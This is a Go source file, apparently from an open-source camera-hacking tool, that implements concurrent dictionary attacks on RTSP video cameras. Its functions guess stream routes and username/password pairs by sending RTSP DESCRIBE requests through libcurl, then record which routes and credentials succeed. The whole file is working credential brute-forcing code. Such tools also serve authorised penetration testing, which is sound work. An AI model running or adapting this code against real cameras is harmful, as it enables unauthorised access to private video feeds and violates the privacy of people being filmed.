// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package cmrdr

import (
	"fmt"
	"time"

	curl "github.com/andelf/go-curl"
	"github.com/pkg/errors"
	v "gopkg.in/go-playground/validator.v9"
)

func doNotWrite([]uint8, interface{}) bool {
	return true
}

func routeAttack(camera Stream, route string, timeout time.Duration, enableLogs bool) (Stream, error) {
	easy := curl.EasyInit()
	defer easy.Cleanup()

	if easy != nil {
		attackURL := fmt.Sprintf(
			"rtsp://%s:%s@%s:%d/%s",
			camera.Username,
			camera.Password,
			camera.Address,
			camera.Port,
			route,
		)

		if enableLogs {
			// Debug logs when logs are enabled
			easy.Setopt(curl.OPT_VERBOSE, 1)
		}

		// Do not send a body in the describe request
		easy.Setopt(curl.OPT_NOBODY, 1)
		// Send a request to the URL of the camera we want to attack
		easy.Setopt(curl.OPT_URL, attackURL)
		// Set the RTSP STREAM URI as the camera URL
		easy.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
		// 2 is CURL_RTSPREQ_DESCRIBE
		easy.Setopt(curl.OPT_RTSP_REQUEST, 2)
		// Set custom timeout
		easy.Setopt(curl.OPT_TIMEOUT_MS, int(timeout/time.Millisecond))

		// Perform the request
		easy.Perform()

		// Get return code for the request
		rc, err := easy.Getinfo(curl.INFO_RESPONSE_CODE)
		if err != nil {
			return camera, err
		}

		// If it's a 404, it means that the route was not valid
		if rc == 404 {
			return camera, errors.New("invalid route")
		}

		camera.Route = route
		return camera, nil
	}
	return camera, errors.New("curl initialization error")
}

func credAttack(camera Stream, username string, password string, timeout time.Duration, enableLogs bool) (Stream, error) {
	easy := curl.EasyInit()
	defer easy.Cleanup()

	if easy != nil {
		attackURL := fmt.Sprintf(
			"rtsp://%s:%s@%s:%d/%s",
			username,
			password,
			camera.Address,
			camera.Port,
			camera.Route,
		)

		if enableLogs {
			// Debug logs when logs are enabled
			easy.Setopt(curl.OPT_VERBOSE, 1)
		}

		// Do not send a body in the describe request
		easy.Setopt(curl.OPT_NOBODY, 1)
		// Do not follow locations from RTSP response
		easy.Setopt(curl.OPT_WRITEFUNCTION, doNotWrite)
		// Send a request to the URL of the camera we want to attack
		easy.Setopt(curl.OPT_URL, attackURL)
		// Set the RTSP STREAM URI as the camera URL
		easy.Setopt(curl.OPT_RTSP_STREAM_URI, attackURL)
		// 2 is CURL_RTSPREQ_DESCRIBE
		easy.Setopt(curl.OPT_RTSP_REQUEST, 2)
		// Set custom timeout
		easy.Setopt(curl.OPT_TIMEOUT_MS, int(timeout/time.Millisecond))

		// Perform the request
		easy.Perform()

		// Get return code for the request
		rc, err := easy.Getinfo(curl.INFO_RESPONSE_CODE)
		if err != nil {
			return camera, err
		}

		// If it's a 403 or a 401, it means that the credentials are not correct
		if rc == 403 || rc == 401 {
			return camera, errors.New("invalid credentials")
		}

		camera.Username = username
		camera.Password = password
		return camera, nil
	}
	return camera, errors.New("curl initialization error")
}

func attackCameraCredentials(target Stream, credentials Credentials, resultsChan chan<- Attack, timeout time.Duration, log bool) {
	for _, username := range credentials.Usernames {
		for _, password := range credentials.Passwords {
			result, err := credAttack(target, username, password, timeout, log)
			if err == nil {
				resultsChan <- Attack{
					stream:           result,
					credentialsFound: true,
					routeFound:       true,
				}
				return
			}
		}
	}
	resultsChan <- Attack{
		stream:           target,
		credentialsFound: false,
	}
}

func attackCameraRoute(target Stream, routes Routes, resultsChan chan<- Attack, timeout time.Duration, log bool) {
	for _, route := range routes {
		result, err := routeAttack(target, route, timeout, log)
		if err == nil {
			resultsChan <- Attack{
				stream:           result,
				credentialsFound: true,
				routeFound:       true,
			}
			return
		}
	}
	resultsChan <- Attack{
		stream:     target,
		routeFound: false,
	}
}

// AttackCredentials attempts to guess the provided targets' credentials using the given
// dictionary or the default dictionary if none was provided by the user
func AttackCredentials(targets []Stream, credentials Credentials, timeout time.Duration, log bool) (results []Stream, err error) {
	attacks := make(chan Attack)
	defer close(attacks)

	validate := v.New()
	for _, target := range targets {
		err := validate.Struct(target)
		if err != nil {
			return targets, errors.Wrap(err, "invalid streams")
		}

		go attackCameraCredentials(target, credentials, attacks, timeout, log)
	}

	attackResults := []Attack{}
	for _ = range targets {
		attackResults = append(attackResults, <-attacks)
	}

	for _, result := range attackResults {
		if result.credentialsFound == true {
			targets = replace(targets, result.stream)
		}
	}

	return targets, nil
}

// AttackRoute attempts to guess the provided targets' streaming routes using the given
// dictionary or the default dictionary if none was provided by the user
func AttackRoute(targets []Stream, routes Routes, timeout time.Duration, log bool) (results []Stream, err error) {
	attacks := make(chan Attack)
	defer close(attacks)

	validate := v.New()
	for _, target := range targets {
		err := validate.Struct(target)
		if err != nil {
			return targets, errors.Wrap(err, "invalid streams")
		}

		go attackCameraRoute(target, routes, attacks, timeout, log)
	}

	attackResults := []Attack{}
	for _ = range targets {
		attackResults = append(attackResults, <-attacks)
	}

	for _, result := range attackResults {
		if result.routeFound == true {
			targets = replace(targets, result.stream)
		}
	}

	return targets, nil
}
